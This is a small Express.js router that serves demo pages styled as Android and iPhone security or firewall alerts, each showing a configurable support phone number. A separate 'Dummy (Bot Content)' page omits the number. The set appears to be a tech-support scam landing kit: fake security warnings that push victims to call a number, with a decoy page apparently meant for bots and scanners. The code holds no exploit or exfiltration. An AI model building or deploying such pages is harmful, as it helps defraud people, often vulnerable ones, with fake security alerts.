const express = require('express');
const router = express.Router();

const phone = process.env.SUPPORT_NUMBER || '+18000000000';

// Demo pages — no filtering, no auth, just view all designs
const pages = [
  { path: '1', view: 'android-secure',   name: 'Android Secure (Neon Green)' },
  { path: '2', view: 'android-material', name: 'Android Guard (Material Design)' },
  { path: '3', view: 'iphone-firewall',  name: 'iPhone Firewall (Neon Blue)' },
  { path: '4', view: 'iphone-glass',     name: 'iOS Firewall (Glass Design)' },
  { path: '5', view: 'dummy',            name: 'Dummy (Bot Content)' }
];

// Demo index — shows links to all pages
router.get('/', (req, res) => {
  res.render('demo-index', { pages });
});

// Individual demo pages
pages.forEach(p => {
  router.get(`/${p.path}`, (req, res) => {
    const data = { title: p.name, phone };
    // dummy doesn't need phone
    if (p.view === 'dummy') delete data.phone;
    res.render(p.view, data);
  });
});

module.exports = router;
